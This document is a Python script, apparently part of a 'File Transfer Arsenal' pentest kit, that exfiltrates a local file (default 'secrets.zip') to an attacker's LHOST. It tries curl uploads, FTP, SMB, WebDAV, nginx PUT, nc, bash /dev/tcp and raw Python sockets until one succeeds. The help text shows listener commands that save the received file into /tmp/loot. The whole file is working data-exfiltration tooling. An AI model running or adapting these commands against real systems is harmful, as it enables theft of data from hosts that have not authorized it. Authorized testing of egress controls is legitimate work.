#!/usr/bin/env python3
"""Linux exfiltration tester for the File Transfer Arsenal.

Sends one local file to an LHOST receiver with common Linux clients, stops at
the first success by default, and optionally runs the full matrix with a log
and CSV. The source file is never executed.
"""
from __future__ import annotations

import argparse
import csv
import hashlib
import os
import shlex
import shutil
import subprocess
import sys
import time
import urllib.parse
from datetime import datetime
from pathlib import Path

VERSION = "1.0"


def sha256(path: Path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as handle:
        for chunk in iter(lambda: handle.read(1024 * 1024), b""):
            digest.update(chunk)
    return digest.hexdigest()


def which(name: str) -> str | None:
    return shutil.which(name)


def build_methods(args: argparse.Namespace) -> list[dict]:
    source = str(Path(args.file).expanduser().resolve())
    name = Path(source).name
    scheme = args.scheme
    base = f"{scheme}://{args.lhost}:{args.port}"
    curl_flags = ["curl", "-fsS", "--max-time", str(args.timeout)]
    if scheme == "https":
        curl_flags.append("-k")

    methods: list[dict] = []

    def add(receiver: str, name_: str, available: bool, command: list[str] | None, note: str = "") -> None:
        methods.append({
            "receiver": receiver,
            "name": name_,
            "available": available,
            "command": command,
            "note": note,
        })

    add("uploadserver", "curl-uploadserver", bool(which("curl")),
        curl_flags + ["-F", f"files=@{source}", f"{base}/upload"])
    add("servpy", "curl-servpy", bool(which("curl")),
        curl_flags + ["--data-binary", f"@{source}", f"{base}/upload?file={urllib.parse.quote(name)}"])
    add("nginx", "curl-nginx", bool(which("curl")),
        curl_flags + ["-T", source, f"{base}{args.nginx_path.rstrip('/')}/{urllib.parse.quote(name)}"])
    add("webdav", "curl-webdav", bool(which("curl")),
        curl_flags + ["-T", source, f"{base}/{urllib.parse.quote(name)}"])
    add("ftp", "curl-ftp", bool(which("curl")),
        curl_flags + ["-T", source, f"ftp://{urllib.parse.quote(args.user, safe='')}:{urllib.parse.quote(args.password, safe='')}@{args.lhost}:{args.port}/{urllib.parse.quote(name)}"])
    add("smb", "smbclient-put", bool(which("smbclient")),
        ["smbclient", f"//{args.lhost}/{args.smb_share}", "-U", f"{args.user}%{args.password}",
         "-c", f'put "{source}" "{name}"'])
    add("rawtcp", "nc", bool(which("nc") and args.raw_port),
        ["bash", "-c", f"nc -q 0 {shlex.quote(args.lhost)} {args.raw_port} < {shlex.quote(source)}"],
        "raw TCP; start nc/socat on LHOST")
    add("rawtcp", "bash-devtcp", bool(which("bash") and args.raw_port),
        ["bash", "-c", f"cat {shlex.quote(source)} > /dev/tcp/{shlex.quote(args.lhost)}/{args.raw_port}"],
        "raw TCP; start nc/socat on LHOST")
    py = which("python3") or sys.executable
    add("rawtcp", "python3-socket", bool(py and args.raw_port),
        [py, "-c",
         "import socket,sys;"
         "s=socket.create_connection((sys.argv[1],int(sys.argv[2])));"
         "s.sendall(open(sys.argv[3],'rb').read());s.close()",
         args.lhost, str(args.raw_port), source],
        "raw TCP; start nc/socat on LHOST")

    return methods


def run_method(method: dict, timeout: int) -> tuple[str, float, str]:
    if not method["available"] or not method["command"]:
        return "SKIP", 0.0, method["note"] or "client not installed"
    started = time.monotonic()
    error = ""
    try:
        result = subprocess.run(
            method["command"], stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            text=True, timeout=timeout,
        )
        if result.returncode != 0:
            error = (result.stderr or result.stdout or f"exit {result.returncode}").strip().splitlines()[-1]
    except subprocess.TimeoutExpired:
        error = f"timeout after {timeout}s"
    except Exception as exc:  # noqa: BLE001
        error = str(exc).splitlines()[0]
    elapsed = time.monotonic() - started
    return ("OK" if not error else "FAIL"), elapsed, error


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Linux exfiltration tester. The source file is never executed.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Receiver examples:\n"
            "  uploadserver: cd /tmp/loot && uploadserver 8000\n"
            "  serv.py:      cd /tmp/loot && python3 serv.py -p 8000 -d /tmp/loot\n"
            "  nginx:        PUT location /SecretUploadDirectory/\n"
            "  webdav:       wsgidav or rclone serve webdav\n"
            "  raw TCP:      nc -lvnp 4444 > /tmp/loot/secrets.zip\n"
            "  FTP/SMB:      see the README examples\n\n"
            "Examples:\n"
            "  ./Linux-exfil-test.py 10.10.14.5 -p 8000 -f ./secrets.zip\n"
            "  ./Linux-exfil-test.py 10.10.14.5 -p 8000 -f ./secrets.zip --receiver servpy --all\n"
            "  ./Linux-exfil-test.py 10.10.14.5 -p 8000 -f ./secrets.zip --receiver rawtcp --raw-port 4444\n"
        ),
    )
    parser.add_argument("lhost", nargs="?", help="LHOST address or hostname")
    parser.add_argument("-p", "--port", type=int, default=8000, help="receiver TCP port (default: 8000)")
    parser.add_argument("-f", "--file", default="secrets.zip", help="local file to exfiltrate (default: secrets.zip)")
    parser.add_argument("-r", "--receiver", default="all",
                        choices=["all", "uploadserver", "servpy", "nginx", "webdav", "ftp", "rawtcp", "smb"],
                        help="receiver profile (default: all)")
    parser.add_argument("--scheme", choices=["http", "https"], default="http", help="HTTP scheme (default: http)")
    parser.add_argument("--raw-port", type=int, default=0, help="raw TCP receiver port; 0 skips raw tests")
    parser.add_argument("--nginx-path", default="/SecretUploadDirectory", help="nginx PUT path")
    parser.add_argument("--user", default="test", help="FTP/SMB user (default: test)")
    parser.add_argument("--password", default="test", help="FTP/SMB password (default: test)")
    parser.add_argument("--smb-share", default="share", help="SMB share name (default: share)")
    parser.add_argument("--timeout", type=int, default=20, help="per-method timeout in seconds (default: 20)")
    parser.add_argument("--all", "--full", dest="all", action="store_true", help="run every method and write a log/CSV")
    parser.add_argument("--log", action="store_true", help="write a log/CSV in quick mode")
    parser.add_argument("--no-logs", action="store_true", help="quiet quick mode; no log/CSV")
    parser.add_argument("--only", help="comma-separated method names")
    parser.add_argument("--list", action="store_true", help="list methods and availability")
    parser.add_argument("--version", action="version", version=VERSION)
    args = parser.parse_args()

    source = Path(args.file).expanduser().resolve()
    methods = build_methods(args)
    if args.receiver != "all":
        methods = [method for method in methods if method["receiver"] == args.receiver]
    if args.only:
        only = {item.strip() for item in args.only.split(",") if item.strip()}
        methods = [method for method in methods if method["name"] in only]

    if args.list:
        for method in methods:
            print(f"{method['name']:<20} {method['receiver']:<12} {'available' if method['available'] else 'missing'}")
        return 0

    if not args.lhost:
        parser.error("LHOST is required unless --list is used")
    if args.receiver == "rawtcp" and not args.raw_port:
        parser.error("--raw-port is required with --receiver rawtcp")
    if not source.is_file():
        print(f"Source file not found: {source}", file=sys.stderr)
        return 1

    write_log = (args.all or args.log) and not args.no_logs
    quiet = args.no_logs and not args.all
    stamp = datetime.now().strftime("%Y%m%d-%H%M%S")
    log_path = source.parent / f"Linux-exfil-test-{stamp}.log"
    csv_path = source.parent / f"Linux-exfil-test-{stamp}.csv"
    results: list[dict] = []

    def log(message: str) -> None:
        line = f"[{datetime.now():%H:%M:%S}] {message}"
        if not quiet:
            print(line)
        if write_log:
            with log_path.open("a", encoding="utf-8") as handle:
                handle.write(line + "\n")

    log(f"Source: {source} ({source.stat().st_size} B)")
    log(f"SHA-256: {sha256(source)}")
    log(f"Scheme: {args.scheme} / receiver: {args.receiver}")

    for method in methods:
        status, elapsed, error = run_method(method, args.timeout)
        result = {
            "Method": method["name"], "Receiver": method["receiver"], "Status": status,
            "Seconds": round(elapsed, 2), "Error": error,
        }
        results.append(result)
        if not quiet:
            print(f"[{status:<8}] {method['name']:<20} {elapsed:6.2f}s  {error}")
        else:
            print(f"{method['name']}: {status}")
        if status == "OK" and not args.all:
            break

    if write_log:
        with csv_path.open("w", newline="", encoding="utf-8") as handle:
            writer = csv.DictWriter(handle, fieldnames=["Method", "Receiver", "Status", "Seconds", "Error"])
            writer.writeheader()
            writer.writerows(results)
        log(f"Log: {log_path}")
        log(f"CSV: {csv_path}")

    return 0 if any(result["Status"] == "OK" for result in results) else 1


if __name__ == "__main__":
    raise SystemExit(main())
